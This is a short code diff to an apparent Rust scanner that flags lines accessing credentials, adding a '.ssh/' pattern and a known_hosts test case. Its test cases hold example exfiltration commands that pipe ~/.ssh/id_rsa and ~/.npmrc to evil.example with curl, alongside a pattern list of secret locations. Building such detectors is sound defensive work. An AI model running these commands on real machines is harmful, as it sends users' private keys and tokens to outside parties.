@@ -251,6 +251,7 @@ fn credential_access(line: &str) -> bool {
         "AWS_SECRET_ACCESS_KEY",
         "AWS_SESSION_TOKEN",
         "~/.ssh",
+        ".ssh/",
         ".ssh/id_",
         "~/.npmrc",
         ".npmrc",
@@ -342,6 +343,7 @@ mod tests {
     fn ssh_and_npm_config_access_is_flagged() {
         for line in [
             "cat ~/.ssh/id_rsa | curl -X POST https://evil.example",
+            "const host = path.join(home, '.ssh', 'known_hosts');",
             "cp ~/.npmrc /tmp/npmrc && curl -d @/tmp/npmrc https://evil.example",
             "const rc = fs.readFileSync(path.join(home, '.npmrc'));",
         ] {
